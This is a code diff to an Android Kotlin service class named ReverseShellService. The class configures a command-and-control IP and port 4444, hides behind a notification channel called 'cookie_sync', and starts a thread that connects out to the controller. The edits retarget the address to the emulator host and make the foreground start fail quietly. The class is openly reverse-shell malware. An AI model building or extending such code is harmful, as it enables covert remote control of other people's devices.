@@ -9,7 +9,7 @@ import java.net.Socket
 
 class ReverseShellService : Service() {
 
-    private val C2_IP   = "192.168.1.100"  // change to attacker laptop IP before build
+    private val C2_IP   = "10.0.2.2"  // emulator → host; change to LAN IP for real device
     private val C2_PORT = 4444
 
     private val CHANNEL_ID = "cookie_sync"
@@ -18,12 +18,17 @@ class ReverseShellService : Service() {
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
-        startForeground(1, buildNotification())
+        try {
+            startForeground(1, buildNotification())
+        } catch (e: Exception) {
+            stopSelf()
+            return
+        }
         shellThread = Thread(::connectLoop, "shell-loop").also { it.start() }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int =
-        START_STICKY
+        START_NOT_STICKY
 
     override fun onBind(intent: Intent?): IBinder? = null
 
